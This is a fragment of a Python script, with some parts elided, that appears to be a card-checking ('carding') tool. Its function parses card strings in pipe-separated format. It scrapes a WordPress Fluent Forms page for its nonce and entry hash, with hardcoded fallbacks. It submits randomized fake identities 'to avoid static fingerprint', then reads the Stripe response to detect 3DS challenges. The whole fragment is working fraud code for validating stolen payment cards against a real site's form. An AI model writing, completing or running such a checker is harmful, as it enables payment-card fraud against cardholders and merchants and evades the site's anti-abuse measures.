...
import time
import re
from bs4 import BeautifulSoup  # <-- you need to install: pip install beautifulsoup4
...
# ------------------ Main function (UPDATED with dynamic nonce/hash) ------------------
def Tele(ccx):
    # 1. Parse card
    ccx = ccx.strip()
    parts = ccx.split("|")
    ...
    try:
        ...
        # Find the Fluent Form nonce
        nonce_input = soup.find("input", {"name": "_fluentform_15_fluentformnonce"})
        nonce = nonce_input.get("value") if nonce_input else "5b0254df82"  # fallback

        # Find the entry intermediate hash (often in a hidden input or in the form action)
        hash_input = soup.find("input", {"name": "__entry_intermediate_hash"})
        entry_hash = hash_input.get("value") if hash_input else "45f911f25572031052b307ec4cbc1189"  # fallback
    except Exception as e:
        print(f"[DEBUG] Failed to extract page data: {e}")
        # Fallback hardcoded values (may still work)
        nonce = "5b0254df82"
        entry_hash = "45f911f25572031052b307ec4cbc1189"

    # 4. Generate random personal data (to avoid static fingerprint)
    first_name, last_name = generate_full_name()
    address_line1, city, country_code, zip_code, phone = generate_address()
    email = generate_email()
    # Use the generated names (not hardcoded)
    # For this demo, we keep some static for compatibility, but we can randomize everything.
    # However, the form expects certain fields; we'll use random but keep consistent with the form structure.
    ...
    # Use random but realistic data; keep structure exactly as the form expects.
    # We'll use the generated first_name and last_name
    form_data = {
    ...
    print(f"[DEBUG] First response: {response_text[:200]}")  # debug

    # 9. Check for SCA/3DS
    try:
        data1 = resp1.json()
        if isinstance(data1, dict):
            # Fluent Forms may return success with action 'sca_required' or with payment_intent_id
            if data1.get('data') and isinstance(data1['data'], dict):
                ...
                if inner.get('action') == 'sca_required' or inner.get('payment_intent_id'):
                    ...
                    if payment_intent_id and submission_id:
